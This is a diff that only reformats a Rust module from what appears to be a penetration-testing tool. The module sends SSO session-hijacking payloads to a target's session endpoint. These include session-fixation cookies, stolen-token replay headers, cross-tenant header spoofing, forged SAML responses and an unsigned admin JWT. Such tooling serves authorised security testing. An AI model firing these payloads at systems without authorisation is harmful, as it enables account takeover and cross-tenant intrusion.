@@ -34,24 +34,80 @@ const SSO_ENDPOINTS: &[(&str, &str)] = &[
 ];
 
 const HIJACK_PAYLOADS: &[(&str, &str, &str)] = &[
-    ("Session fixation — set cookie", "GET", "Cookie: SESSIONID=attacker_session_12345"),
-    ("Session fixation — set via param", "GET", "?session=attacker_session_12345"),
-    ("Token replay — Bearer", "GET", "Authorization: Bearer stolen_token_value"),
-    ("Token replay — X-Auth-Token", "GET", "X-Auth-Token: stolen_token_value"),
+    (
+        "Session fixation — set cookie",
+        "GET",
+        "Cookie: SESSIONID=attacker_session_12345",
+    ),
+    (
+        "Session fixation — set via param",
+        "GET",
+        "?session=attacker_session_12345",
+    ),
+    (
+        "Token replay — Bearer",
+        "GET",
+        "Authorization: Bearer stolen_token_value",
+    ),
+    (
+        "Token replay — X-Auth-Token",
+        "GET",
+        "X-Auth-Token: stolen_token_value",
+    ),
     ("Cross-tenant access", "GET", "X-Tenant-ID: target_tenant"),
-    ("Cross-tenant via header", "GET", "X-Forwarded-Tenant: target_tenant"),
-    ("Cross-tenant via path", "GET", "X-Original-URL: /target_tenant/admin"),
-    ("SAML response replay", "POST", "SAMLResponse=PHNhbWxwOlJlc3BvbnNl"),
-    ("SAML assertion injection", "POST", "SAMLResponse=base64_forged_assertion"),
-    ("OIDC code replay", "GET", "?code=stolen_auth_code&state=test"),
-    ("OIDC token injection", "POST", "access_token=stolen_token&token_type=Bearer"),
+    (
+        "Cross-tenant via header",
+        "GET",
+        "X-Forwarded-Tenant: target_tenant",
+    ),
+    (
+        "Cross-tenant via path",
+        "GET",
+        "X-Original-URL: /target_tenant/admin",
+    ),
+    (
+        "SAML response replay",
+        "POST",
+        "SAMLResponse=PHNhbWxwOlJlc3BvbnNl",
+    ),
+    (
+        "SAML assertion injection",
+        "POST",
+        "SAMLResponse=base64_forged_assertion",
+    ),
+    (
+        "OIDC code replay",
+        "GET",
+        "?code=stolen_auth_code&state=test",
+    ),
+    (
+        "OIDC token injection",
+        "POST",
+        "access_token=stolen_token&token_type=Bearer",
+    ),
     ("Session token in URL", "GET", "?token=stolen_session_token"),
-    ("JWT replay", "GET", "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."),
-    ("Refresh token abuse", "POST", "refresh_token=stolen_refresh&grant_type=refresh_token"),
-    ("WS-Fed token replay", "GET", "?wa=wsignin1.0&wresult=stolen_token"),
+    (
+        "JWT replay",
+        "GET",
+        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    ),
+    (
+        "Refresh token abuse",
+        "POST",
+        "refresh_token=stolen_refresh&grant_type=refresh_token",
+    ),
+    (
+        "WS-Fed token replay",
+        "GET",
+        "?wa=wsignin1.0&wresult=stolen_token",
+    ),
     ("ADFS token replay", "POST", "wresult=stoken_adfs_token"),
     ("Session prediction", "GET", "Cookie: SESSIONID=0000000001"),
-    ("Session prediction — admin", "GET", "Cookie: SESSIONID=admin"),
+    (
+        "Session prediction — admin",
+        "GET",
+        "Cookie: SESSIONID=admin",
+    ),
 ];
 
 pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
@@ -72,10 +128,18 @@ pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
                 let status = resp.status().as_u16();
                 let body = resp.text().await.unwrap_or_default();
                 let accessible = status == 200 || status == 302;
-                let has_sso = body.contains("saml") || body.contains("oauth") || body.contains("openid")
-                    || body.contains("login") || body.contains("session") || body.contains("token");
+                let has_sso = body.contains("saml")
+                    || body.contains("oauth")
+                    || body.contains("openid")
+                    || body.contains("login")
+                    || body.contains("session")
+                    || body.contains("token");
                 let tag = if accessible {
-                    if has_sso { "SSO PAGE".green().bold().to_string() } else { "accessible".green().to_string() }
+                    if has_sso {
+                        "SSO PAGE".green().bold().to_string()
+                    } else {
+                        "accessible".green().to_string()
+                    }
                 } else if status == 401 || status == 403 {
                     "auth".yellow().to_string()
                 } else {
@@ -92,14 +156,22 @@ pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
         }
     }
 
-    println!("\n{} [2/2] Session hijacking payloads...", "[*]".cyan().bold());
-    println!("  {} Testing {} hijack vectors...", "*".cyan(), HIJACK_PAYLOADS.len());
+    println!(
+        "\n{} [2/2] Session hijacking payloads...",
+        "[*]".cyan().bold()
+    );
+    println!(
+        "  {} Testing {} hijack vectors...",
+        "*".cyan(),
+        HIJACK_PAYLOADS.len()
+    );
     let mut results = Vec::new();
 
     for (name, method, header_value) in HIJACK_PAYLOADS {
         let test_url = format!("{}/api/session", base);
         let mut req = if *method == "POST" {
-            client.post(&test_url)
+            client
+                .post(&test_url)
                 .header("Content-Type", "application/x-www-form-urlencoded")
                 .body(header_value.to_string())
         } else {
@@ -129,9 +201,13 @@ pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
                 let status = resp.status().as_u16();
                 let set_cookie = resp.headers().get("set-cookie").is_some();
                 let body = resp.text().await.unwrap_or_default();
-                let has_session = body.contains("session") || body.contains("token") || body.contains("user");
-                let has_admin = body.contains("admin") || body.contains("role") || body.contains("privilege");
-                let has_error = body.contains("error") || body.contains("invalid") || body.contains("unauthorized");
+                let has_session =
+                    body.contains("session") || body.contains("token") || body.contains("user");
+                let has_admin =
+                    body.contains("admin") || body.contains("role") || body.contains("privilege");
+                let has_error = body.contains("error")
+                    || body.contains("invalid")
+                    || body.contains("unauthorized");
 
                 let tag = if (has_session || has_admin) && !has_error {
                     "HIJACKED".red().bold().to_string()
@@ -153,12 +229,21 @@ pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
                 );
 
                 if (has_session || has_admin) && !has_error {
-                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        body.chars().take(200).collect::<String>()
+                    );
                     results.push(*name);
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:40} error", "*".red(), results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:40} error",
+                    "*".red(),
+                    results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -173,23 +258,44 @@ pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Res
 
     if !results.is_empty() {
         let fixation = results.iter().any(|n| n.contains("fixation"));
-        let replay = results.iter().any(|n| n.contains("replay") || n.contains("Replay"));
-        let cross_tenant = results.iter().any(|n| n.contains("tenant") || n.contains("Tenant"));
-        let prediction = results.iter().any(|n| n.contains("prediction") || n.contains("Prediction"));
+        let replay = results
+            .iter()
+            .any(|n| n.contains("replay") || n.contains("Replay"));
+        let cross_tenant = results
+            .iter()
+            .any(|n| n.contains("tenant") || n.contains("Tenant"));
+        let prediction = results
+            .iter()
+            .any(|n| n.contains("prediction") || n.contains("Prediction"));
         if fixation {
-            println!("{} [CRITICAL] Session fixation — attacker-controlled session accepted!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] Session fixation — attacker-controlled session accepted!",
+                "[!]".red().bold()
+            );
         }
         if replay {
-            println!("{} [CRITICAL] Token replay — stolen tokens accepted!", "[!]".red().bold());
+            println!(
+                "{} [CRITICAL] Token replay — stolen tokens accepted!",
+                "[!]".red().bold()
+            );
         }
         if cross_tenant {
-            println!("{} [HIGH] Cross-tenant access — lateral movement between tenants!", "[!]".red().bold());
+            println!(
+                "{} [HIGH] Cross-tenant access — lateral movement between tenants!",
+                "[!]".red().bold()
+            );
         }
         if prediction {
-            println!("{} [MEDIUM] Session prediction — predictable session IDs!", "[!]".yellow().bold());
+            println!(
+                "{} [MEDIUM] Session prediction — predictable session IDs!",
+                "[!]".yellow().bold()
+            );
         }
     } else {
-        println!("{} No SSO hijacking vulnerabilities detected.", "[-]".green().bold());
+        println!(
+            "{} No SSO hijacking vulnerabilities detected.",
+            "[-]".green().bold()
+        );
     }
 
     Ok(())
